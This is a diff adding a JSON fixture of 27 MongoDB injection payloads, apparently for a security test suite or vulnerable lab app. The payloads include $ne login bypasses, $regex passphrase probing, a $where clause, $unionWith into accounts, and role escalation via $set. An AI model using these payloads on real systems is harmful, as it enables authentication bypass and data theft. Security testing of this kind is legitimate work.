@@ -1,0 +1,322 @@
+{
+  "mongo-001": {
+    "method": "POST",
+    "endpoints": [
+      "/api/mongo/sign-in/branch",
+      "/api/mongo/sign-in/front-desk",
+      "/api/mongo/sign-in/kiosk",
+      "/api/mongo/sign-in/mobile"
+    ],
+    "input": {
+      "username": "admin",
+      "passphrase": {
+        "$ne": ""
+      }
+    }
+  },
+  "mongo-002": {
+    "method": "POST",
+    "endpoints": [
+      "/api/mongo/sign-in/partner",
+      "/api/mongo/sign-in/vendor"
+    ],
+    "input": {
+      "username": "admin",
+      "passphrase": {
+        "$ne": ""
+      }
+    }
+  },
+  "mongo-003": {
+    "method": "POST",
+    "endpoints": [
+      "/api/mongo/sign-in/gateway",
+      "/api/mongo/sign-in/portal"
+    ],
+    "input": {
+      "username": "admin",
+      "passphrase": {
+        "$ne": ""
+      }
+    }
+  },
+  "mongo-004": {
+    "method": "POST",
+    "endpoints": [
+      "/api/mongo/sign-in/lobby",
+      "/api/mongo/sign-in/reception"
+    ],
+    "input": {
+      "username": "admin",
+      "passphrase": "x",
+      "code": {
+        "$ne": ""
+      }
+    }
+  },
+  "mongo-005": {
+    "method": "POST",
+    "endpoints": [
+      "/api/mongo/sign-in/console",
+      "/api/mongo/sign-in/terminal"
+    ],
+    "input": {
+      "username": "admin",
+      "passphrase": "$passphrase"
+    }
+  },
+  "mongo-006": {
+    "method": "GET",
+    "endpoints": [
+      "/api/mongo/articles/shelf",
+      "/api/mongo/directory/badge",
+      "/api/mongo/directory/desk",
+      "/api/mongo/directory/locker"
+    ],
+    "input": "username=admin&inviteCode[$ne]=x"
+  },
+  "mongo-007": {
+    "method": "POST",
+    "endpoints": [
+      "/api/mongo/articles/entry",
+      "/api/mongo/articles/item"
+    ],
+    "input": {
+      "id": {
+        "$exists": true
+      }
+    }
+  },
+  "mongo-008": {
+    "method": "GET",
+    "endpoints": [
+      "/api/mongo/articles/browse",
+      "/api/mongo/articles/budget",
+      "/api/mongo/articles/range",
+      "/api/mongo/articles/topic",
+      "/api/mongo/articles/view"
+    ],
+    "input": "category=' || true || '"
+  },
+  "mongo-009": {
+    "method": "POST",
+    "endpoints": [
+      "/api/mongo/articles/rank",
+      "/api/mongo/articles/score"
+    ],
+    "input": {
+      "weight": "0 + 6 * 7"
+    }
+  },
+  "mongo-010": {
+    "method": "GET",
+    "endpoints": [
+      "/api/mongo/articles/match",
+      "/api/mongo/articles/search"
+    ],
+    "input": "filter={\"published\":false}"
+  },
+  "mongo-011": {
+    "method": "POST",
+    "endpoints": [
+      "/api/mongo/articles/catalogue",
+      "/api/mongo/articles/listing"
+    ],
+    "input": {
+      "published": {
+        "$in": [
+          true,
+          false
+        ]
+      }
+    }
+  },
+  "mongo-012": {
+    "method": "POST",
+    "endpoints": [
+      "/api/mongo/directory/count",
+      "/api/mongo/directory/tally"
+    ],
+    "input": {
+      "filter": {
+        "username": "admin",
+        "passphrase": {
+          "$regex": "^admin-l"
+        }
+      }
+    }
+  },
+  "mongo-013": {
+    "method": "POST",
+    "endpoints": [
+      "/api/mongo/bookings/close",
+      "/api/mongo/bookings/finish"
+    ],
+    "input": {
+      "booking": {
+        "holder": {
+          "$ne": "alice"
+        }
+      }
+    }
+  },
+  "mongo-014": {
+    "method": "POST",
+    "endpoints": [
+      "/api/mongo/bookings/discard",
+      "/api/mongo/bookings/remove"
+    ],
+    "input": {
+      "holder": {
+        "$ne": "alice"
+      }
+    }
+  },
+  "mongo-015": {
+    "method": "POST",
+    "endpoints": [
+      "/api/mongo/bookings/accept",
+      "/api/mongo/bookings/confirm"
+    ],
+    "input": {
+      "reference": {
+        "$ne": ""
+      }
+    }
+  },
+  "mongo-016": {
+    "method": "POST",
+    "endpoints": [
+      "/api/mongo/reports/named",
+      "/api/mongo/reports/run"
+    ],
+    "input": {
+      "stages": [
+        {
+          "$limit": 1
+        },
+        {
+          "$unionWith": "accounts"
+        },
+        {
+          "$match": {
+            "username": "admin"
+          }
+        }
+      ]
+    }
+  },
+  "mongo-017": {
+    "method": "POST",
+    "endpoints": [
+      "/api/mongo/reports/overview",
+      "/api/mongo/reports/summary"
+    ],
+    "input": {
+      "only": {
+        "reviewerNote": {
+          "$regex": "^zazzles-note-a"
+        }
+      }
+    }
+  },
+  "mongo-018": {
+    "method": "GET",
+    "endpoints": [
+      "/api/mongo/reports/breakdown",
+      "/api/mongo/reports/totals"
+    ],
+    "input": "by=reviewerNote"
+  },
+  "mongo-019": {
+    "method": "POST",
+    "endpoints": [
+      "/api/mongo/members/details",
+      "/api/mongo/members/profile",
+      "/api/mongo/members/settings"
+    ],
+    "input": {
+      "access.role": "admin"
+    }
+  },
+  "mongo-020": {
+    "method": "POST",
+    "endpoints": [
+      "/api/mongo/members/options",
+      "/api/mongo/members/preferences"
+    ],
+    "input": {
+      "access.role": "admin"
+    }
+  },
+  "mongo-021": {
+    "method": "POST",
+    "endpoints": [
+      "/api/mongo/members/entry",
+      "/api/mongo/members/record"
+    ],
+    "input": {
+      "changes": {
+        "$set": {
+          "access.role": "admin"
+        }
+      }
+    }
+  },
+  "mongo-022": {
+    "method": "POST",
+    "endpoints": [
+      "/api/mongo/members/alias",
+      "/api/mongo/members/nickname"
+    ],
+    "input": {
+      "displayName": "$passphrase"
+    }
+  },
+  "mongo-023": {
+    "method": "GET",
+    "endpoints": [
+      "/api/mongo/articles/ordered",
+      "/api/mongo/articles/sorted"
+    ],
+    "input": "order=reviewerNote"
+  },
+  "mongo-024": {
+    "method": "GET",
+    "endpoints": [
+      "/api/mongo/directory/card",
+      "/api/mongo/directory/contact"
+    ],
+    "input": "fields=displayName,passphrase"
+  },
+  "mongo-025": {
+    "method": "GET",
+    "endpoints": [
+      "/api/mongo/directory/locate",
+      "/api/mongo/directory/resolve"
+    ],
+    "input": "by=$where&value=this.access.role === 'admin'"
+  },
+  "mongo-026": {
+    "method": "POST",
+    "endpoints": [
+      "/api/mongo/invites/check",
+      "/api/mongo/invites/claim",
+      "/api/mongo/invites/open",
+      "/api/mongo/invites/redeem"
+    ],
+    "input": {
+      "code": ".*"
+    }
+  },
+  "mongo-027": {
+    "method": "POST",
+    "endpoints": [
+      "/api/mongo/invites/accept",
+      "/api/mongo/invites/join"
+    ],
+    "input": {
+      "code": "zz-admin-[0-9]+"
+    }
+  }
+}
